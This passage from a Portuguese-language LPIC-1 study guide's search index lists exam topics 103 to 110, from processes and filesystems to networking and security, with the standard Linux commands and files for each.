<code>tar</code>, <code>dd</code>, <code>gzip</code> </li> <li>Pipes e Redirecionamentos \u2192 <code>tee</code>, <code>xargs</code>, operadores <code>&gt;</code>, <code>&gt;&gt;</code>, <code>2&gt;</code> </li> <li>Processos \u2192 <code>ps</code>, <code>top</code>, <code>kill</code>, <code>jobs</code>, <code>nohup</code>, <code>screen</code>, <code>tmux</code> </li> <li>Prioridade de Execu\u00e7\u00e3o \u2192 <code>nice</code>, <code>renice</code> </li> <li>Regex em Arquivos \u2192 <code>grep</code>, <code>egrep</code>, <code>sed</code>, <code>regex(7)</code> </li> <li>Edi\u00e7\u00e3o de Arquivos \u2192 <code>vi</code>, <code>nano</code>, <code>emacs</code>, vari\u00e1veis <code>EDITOR</code> </li> </ul>"},{"location":"Visao_Geral/#topico-104-dispositivos-sistemas-de-arquivos-e-fhs","title":"T\u00f3pico 104 - Dispositivos, Sistemas de Arquivos e FHS","text":"<ul> <li>Parti\u00e7\u00f5es e FS \u2192 <code>fdisk</code>, <code>gdisk</code>, <code>parted</code>, <code>mkfs</code>, <code>mkswap</code> </li> <li>Integridade FS \u2192 <code>fsck</code>, <code>tune2fs</code>, <code>xfs_repair</code> </li> <li>Montagem/Desmontagem \u2192 <code>mount</code>, <code>umount</code>, <code>/etc/fstab</code>, <code>lsblk</code> </li> <li>Permiss\u00f5es e Propriedade \u2192 <code>chmod</code>, <code>umask</code>, <code>chown</code>, <code>chgrp</code> </li> <li>Links \u2192 <code>ln</code>, <code>ls</code> </li> <li>Localiza\u00e7\u00e3o de Arquivos \u2192 <code>find</code>, <code>locate</code>, <code>updatedb</code>, <code>which</code>, <code>/etc/updatedb.conf</code> </li> </ul>"},{"location":"Visao_Geral/#exame-102-topicos-105-a-110","title":"Exame 102 (T\u00f3picos 105 a 110)","text":""},{"location":"Visao_Geral/#topico-105-shell-e-scripts","title":"T\u00f3pico 105 - Shell e Scripts","text":"<ul> <li>Ambiente de Shell \u2192 <code>PATH</code>, <code>alias</code>, <code>~/.bashrc</code>, <code>/etc/profile</code> </li> <li>Scripts B\u00e1sicos \u2192 <code>for</code>, <code>while</code>, <code>if</code>, <code>read</code>, <code>exec</code>, <code>&amp;&amp;</code>, <code>||</code> </li> </ul>"},{"location":"Visao_Geral/#topico-106-interfaces-de-usuarios-e-desktops","title":"T\u00f3pico 106 - Interfaces de Usu\u00e1rios e Desktops","text":"<ul> <li>X11 \u2192 <code>/etc/X11/xorg.conf</code>, <code>xhost</code>, <code>DISPLAY</code> </li> <li>Desktops \u2192 KDE, Gnome, Xfce, VNC, RDP  </li> <li>Acessibilidade \u2192 Leitor de Tela, Alto Contraste, Teclado Virtual  </li> </ul>"},{"location":"Visao_Geral/#topico-107-tarefas-administrativas","title":"T\u00f3pico 107 - Tarefas Administrativas","text":"<ul> <li>Usu\u00e1rios/Grupos \u2192 <code>useradd</code>, <code>usermod</code>, <code>/etc/passwd</code>, <code>/etc/shadow</code> </li> <li>Automatiza\u00e7\u00e3o \u2192 <code>cron</code>, <code>at</code>, <code>systemd timers</code> </li> <li>Internacionaliza\u00e7\u00e3o \u2192 <code>LANG</code>, <code>LC_ALL</code>, <code>/etc/localtime</code>, <code>timedatectl</code> </li> </ul>"},{"location":"Visao_Geral/#topico-108-servicos-essenciais-do-sistema","title":"T\u00f3pico 108 - Servi\u00e7os Essenciais do Sistema","text":"<ul> <li>Hora/Data \u2192 <code>date</code>, <code>hwclock</code>, <code>ntpd</code>, <code>chrony</code> </li> <li>Logs \u2192 <code>rsyslog</code>, <code>logrotate</code>, <code>journalctl</code> </li> <li>MTA \u2192 <code>sendmail</code>, <code>postfix</code>, <code>mail</code> </li> <li>Impress\u00e3o \u2192 <code>cups</code>, <code>lpq</code>, <code>lpr</code> </li> </ul>"},{"location":"Visao_Geral/#topico-109-fundamentos-de-rede","title":"T\u00f3pico 109 - Fundamentos de Rede","text":"<ul> <li>Protocolos \u2192 TCP, UDP, ICMP, IPv4, IPv6, portas comuns  </li> <li>Configura\u00e7\u00e3o de Rede \u2192 <code>/etc/hosts</code>, <code>nmcli</code>, <code>hostnamectl</code> </li> <li>Solu\u00e7\u00e3o de Problemas \u2192 <code>ping</code>, <code>traceroute</code>, <code>ip</code>, <code>netstat</code> </li> <li>DNS Cliente \u2192 <code>/etc/resolv.conf</code>, <code>host</code>, <code>dig</code>, <code>getent</code> </li> </ul>"},{"location":"Visao_Geral/#topico-110-seguranca","title":"T\u00f3pico 110 - Seguran\u00e7a","text":"<ul> <li>Administra\u00e7\u00e3o de Seguran\u00e7a \u2192 <code>find</code>, <code>passwd</code>, <code>nmap</code>, <code>sudo</code>, <code>ulimit</code> </li> <li>Seguran\u00e7a de Host \u2192 <code>/etc/shadow</code>, <code>/etc/hosts.allow</code>, <code>systemd.socket</code> </li> <li>Criptografia \u2192 <code>ssh</code>, <code>ssh-keygen</code>, <code>gpg</code>, <code>authorized_keys</code> </li> </ul>"},{"location":"Visao_Geral/#dica-final-estude-os-comandos-na-pratica-simulando-cenarios-reais-em-laboratorio","title":"Dica Final: estude os comandos na pr\u00e1tica, simulando cen\u00e1rios reais em laborat\u00f3rio.","text":""}]}